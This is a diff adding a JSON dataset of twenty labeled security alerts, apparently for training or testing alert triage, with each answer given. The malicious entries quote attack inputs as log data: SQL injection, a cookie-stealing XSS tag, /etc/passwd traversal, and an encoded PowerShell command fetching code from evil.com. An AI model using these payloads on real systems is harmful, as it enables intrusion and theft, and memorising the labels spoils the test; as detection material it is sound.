@@ -1,0 +1,222 @@
+[
+  {
+    "id": "ALERT-001",
+    "timestamp": "2023-10-27T08:00:15Z",
+    "source_ip": "192.168.1.105",
+    "destination_ip": "10.0.0.5",
+    "event_type": "Authentication Success",
+    "severity": "Low",
+    "raw_log": "Oct 27 08:00:15 server-01 sshd[1245]: Accepted publickey for user admin from 192.168.1.105 port 55442 ssh2",
+    "true_label": "Benign",
+    "explanation": "Standard authorized SSH login by an admin user during business hours using a public key."
+  },
+  {
+    "id": "ALERT-002",
+    "timestamp": "2023-10-27T08:15:22Z",
+    "source_ip": "10.0.0.5",
+    "destination_ip": "169.254.169.254",
+    "event_type": "System Update",
+    "severity": "Info",
+    "raw_log": "{\"eventSource\": \"yum\", \"eventName\": \"Update\", \"package\": \"kernel-3.10.0-1160\", \"status\": \"Success\", \"user\": \"root\"}",
+    "true_label": "Benign",
+    "explanation": "Automatic system kernel patch initiated by the root user via package manager."
+  },
+  {
+    "id": "ALERT-003",
+    "timestamp": "2023-10-27T09:30:00Z",
+    "source_ip": "192.168.1.50",
+    "destination_ip": "10.0.2.10",
+    "event_type": "Password Reset",
+    "severity": "Low",
+    "raw_log": "EventID=4724; Task=User Account Management; TargetUserName=jdoe; Status=Success; Actor=HelpDesk_Bot",
+    "true_label": "Benign",
+    "explanation": "User initiated a self-service password reset which was successfully processed by the domain controller."
+  },
+  {
+    "id": "ALERT-004",
+    "timestamp": "2023-10-27T10:05:45Z",
+    "source_ip": "10.0.0.20",
+    "destination_ip": "10.0.0.250",
+    "event_type": "High Network Traffic",
+    "severity": "Medium",
+    "raw_log": "NetFlow: Src=10.0.0.20 Dst=10.0.0.250 Proto=TCP SPort=443 DPort=8080 Bytes=5800000000 Flags=AP",
+    "true_label": "Benign",
+    "explanation": "Scheduled weekly backup job transferring large data volume to the internal backup server."
+  },
+  {
+    "id": "ALERT-005",
+    "timestamp": "2023-10-27T11:12:33Z",
+    "source_ip": "203.0.113.45",
+    "destination_ip": "10.0.5.5",
+    "event_type": "HTTP 404 Error",
+    "severity": "Low",
+    "raw_log": "203.0.113.45 - - [27/Oct/2023:11:12:33 +0000] \"GET /images/logo_v2.png HTTP/1.1\" 404 1243 \"-\" \"Mozilla/5.0\"",
+    "true_label": "Benign",
+    "explanation": "A standard user encountering a broken link or typo on a harmless image resource."
+  },
+  {
+    "id": "ALERT-006",
+    "timestamp": "2023-10-27T12:00:01Z",
+    "source_ip": "127.0.0.1",
+    "destination_ip": "127.0.0.1",
+    "event_type": "Cron Job Execution",
+    "severity": "Info",
+    "raw_log": "Oct 27 12:00:01 web-prod CRON[2933]: (root) CMD (/usr/bin/php /var/www/html/maintenance.php)",
+    "true_label": "Benign",
+    "explanation": "Routine scheduled maintenance script running on localhost."
+  },
+  {
+    "id": "ALERT-007",
+    "timestamp": "2023-10-27T13:45:10Z",
+    "source_ip": "192.168.1.112",
+    "destination_ip": "10.0.3.4",
+    "event_type": "Database Select",
+    "severity": "Low",
+    "raw_log": "LOG:  statement: SELECT * FROM products WHERE category = 'electronics' LIMIT 10;",
+    "true_label": "Benign",
+    "explanation": "Application making a standard read request to the database for product listings."
+  },
+  {
+    "id": "ALERT-008",
+    "timestamp": "2023-10-27T14:20:55Z",
+    "source_ip": "198.51.100.22",
+    "destination_ip": "10.0.0.1",
+    "event_type": "VPN Connection",
+    "severity": "Low",
+    "raw_log": "CSCO_VPN: Session started for user 'mwilson'. Group: 'RemoteUsers'. IP: 198.51.100.22. Duration: 0s.",
+    "true_label": "Benign",
+    "explanation": "Remote employee successfully connecting to the corporate VPN from a recognized ISP."
+  },
+  {
+    "id": "ALERT-009",
+    "timestamp": "2023-10-27T15:10:00Z",
+    "source_ip": "10.0.0.8",
+    "destination_ip": "10.0.0.9",
+    "event_type": "Health Check",
+    "severity": "Info",
+    "raw_log": "ELB-HealthChecker/2.0; GET /health; 200 OK; 0.002s",
+    "true_label": "Benign",
+    "explanation": "Load balancer performing a routine health check on a backend web server instance."
+  },
+  {
+    "id": "ALERT-010",
+    "timestamp": "2023-10-27T16:55:22Z",
+    "source_ip": "192.168.1.200",
+    "destination_ip": "10.0.0.50",
+    "event_type": "File Access",
+    "severity": "Low",
+    "raw_log": "SMB2: Read Request File: \\\\Fileshare\\HR\\Policies\\Handbook_2023.pdf Handle: 0x4821",
+    "true_label": "Benign",
+    "explanation": "HR employee accessing the company handbook on the file server."
+  },
+  {
+    "id": "ALERT-011",
+    "timestamp": "2023-10-27T18:01:05Z",
+    "source_ip": "45.33.22.11",
+    "destination_ip": "10.0.5.5",
+    "event_type": "SQL Injection Attempt",
+    "severity": "High",
+    "raw_log": "10.0.5.5 - - [27/Oct/2023:18:01:05 +0000] \"GET /login.php?user=admin' OR '1'='1 HTTP/1.1\" 200 4522",
+    "true_label": "Malicious",
+    "explanation": "Classic SQL injection pattern using Boolean logic to bypass authentication in the URL parameters."
+  },
+  {
+    "id": "ALERT-012",
+    "timestamp": "2023-10-27T18:05:00Z",
+    "source_ip": "185.200.11.2",
+    "destination_ip": "10.0.0.1",
+    "event_type": "DDoS/SYN Flood",
+    "severity": "Critical",
+    "raw_log": "FIREWALL: DROP TCP 185.200.11.2:4442 -> 10.0.0.1:80 Flags=SYN Count=5000/sec",
+    "true_label": "Malicious",
+    "explanation": "Massive volume of SYN packets attempting to exhaust server resources (Denial of Service)."
+  },
+  {
+    "id": "ALERT-013",
+    "timestamp": "2023-10-27T18:15:30Z",
+    "source_ip": "91.108.5.55",
+    "destination_ip": "10.0.5.5",
+    "event_type": "XSS Attempt",
+    "severity": "High",
+    "raw_log": "POST /comment.php HTTP/1.1 Body=\"<script>alert(document.cookie)</script>\"",
+    "true_label": "Malicious",
+    "explanation": "Cross-Site Scripting (XSS) payload attempting to inject a script tag to steal session cookies."
+  },
+  {
+    "id": "ALERT-014",
+    "timestamp": "2023-10-27T18:30:12Z",
+    "source_ip": "103.145.12.99",
+    "destination_ip": "10.0.0.5",
+    "event_type": "SSH Brute Force",
+    "severity": "High",
+    "raw_log": "Oct 27 18:30:12 server-01 sshd[4421]: Failed password for root from 103.145.12.99 port 44212 ssh2 (Repeat 150 times)",
+    "true_label": "Malicious",
+    "explanation": "Rapid succession of failed login attempts indicating a dictionary or brute force attack."
+  },
+  {
+    "id": "ALERT-015",
+    "timestamp": "2023-10-27T19:00:45Z",
+    "source_ip": "10.0.2.15",
+    "destination_ip": "199.201.5.1",
+    "event_type": "C2 Callback",
+    "severity": "Critical",
+    "raw_log": "IDS ALERT: ET TROJAN Cobalt Strike Beacon Activity to 199.201.5.1",
+    "true_label": "Malicious",
+    "explanation": "Internal host communicating with a known Command & Control (C2) IP address associated with Cobalt Strike."
+  },
+  {
+    "id": "ALERT-016",
+    "timestamp": "2023-10-27T19:45:00Z",
+    "source_ip": "84.15.22.10",
+    "destination_ip": "10.0.5.5",
+    "event_type": "Directory Traversal",
+    "severity": "High",
+    "raw_log": "GET /../../../../etc/passwd HTTP/1.1",
+    "true_label": "Malicious",
+    "explanation": "Attacker attempting to traverse directories to access sensitive system configuration files."
+  },
+  {
+    "id": "ALERT-017",
+    "timestamp": "2023-10-27T20:00:00Z",
+    "source_ip": "1.2.3.4",
+    "destination_ip": "AWS IAM",
+    "event_type": "Impossible Travel",
+    "severity": "High",
+    "raw_log": "{\"eventName\": \"ConsoleLogin\", \"userIdentity\": \"alice\", \"sourceIPAddress\": \"1.2.3.4\", \"location\": \"Tokyo, JP\", \"prevEvent\": {\"time\": \"2023-10-27T19:15:00Z\", \"location\": \"New York, US\"}}",
+    "true_label": "Malicious",
+    "explanation": "User logged in from Tokyo 45 minutes after logging in from New York, which is physically impossible."
+  },
+  {
+    "id": "ALERT-018",
+    "timestamp": "2023-10-27T20:30:15Z",
+    "source_ip": "10.0.2.50",
+    "destination_ip": "10.0.2.50",
+    "event_type": "Obfuscated PowerShell",
+    "severity": "High",
+    "raw_log": "Windows PowerShell: EventID 4104; ScriptBlockText: powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAiACkA",
+    "true_label": "Malicious",
+    "explanation": "Execution of a Base64 encoded PowerShell command (decoded: downloads payload from evil.com), a common tactic to hide malicious scripts."
+  },
+  {
+    "id": "ALERT-019",
+    "timestamp": "2023-10-27T21:10:05Z",
+    "source_ip": "10.0.3.15",
+    "destination_ip": "8.8.8.8",
+    "event_type": "DNS Tunneling",
+    "severity": "Medium",
+    "raw_log": "DNS Query: QName=datachunk5543.creditcards.baddomain.com Type=TXT",
+    "true_label": "Malicious",
+    "explanation": "Suspiciously long DNS subdomains containing what looks like chunks of data, suggesting data exfiltration via DNS protocol."
+  },
+  {
+    "id": "ALERT-020",
+    "timestamp": "2023-10-27T22:00:00Z",
+    "source_ip": "192.168.1.5",
+    "destination_ip": "192.168.1.5",
+    "event_type": "Privilege Escalation",
+    "severity": "High",
+    "raw_log": "usermod: user 'service_account' added to group 'sudoers' by 'service_account'",
+    "true_label": "Malicious",
+    "explanation": "A low-privileged service account suddenly adding itself to the sudoers group, indicating successful privilege escalation."
+  }
+]
